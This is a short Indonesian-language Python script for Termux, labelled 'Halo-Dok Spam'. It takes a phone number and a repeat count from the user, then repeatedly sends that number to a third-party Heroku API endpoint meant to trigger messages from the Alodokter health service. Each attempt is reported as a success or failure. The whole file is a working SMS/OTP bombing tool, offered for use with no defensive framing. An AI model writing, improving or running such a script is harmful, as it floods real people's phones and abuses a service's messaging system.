#!/data/data/com.termux/files/home/spam/alo.py
# -*- coding: utf-8 -*-
import requests, time

print """
#                  !---------------!              #
#                    Halo-Dok Spam                #
#                  !---------------!              #"""

num=raw_input("[In] Nomor: ")
jum=int(input("[In] Jumlah: "))

print("\n[RESULT]")
for x in range(jum):
    try:
        req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":'%s'%(num)})
        if req.json()['status'] == 'ok':
            print("%s. Berhasil %s"%(x+1, num))
        else:
            print("{}. Gagal {}".format(x+1, num))
    except Exception as e:
        print("%s. Pass: %s"%(x+1, e))
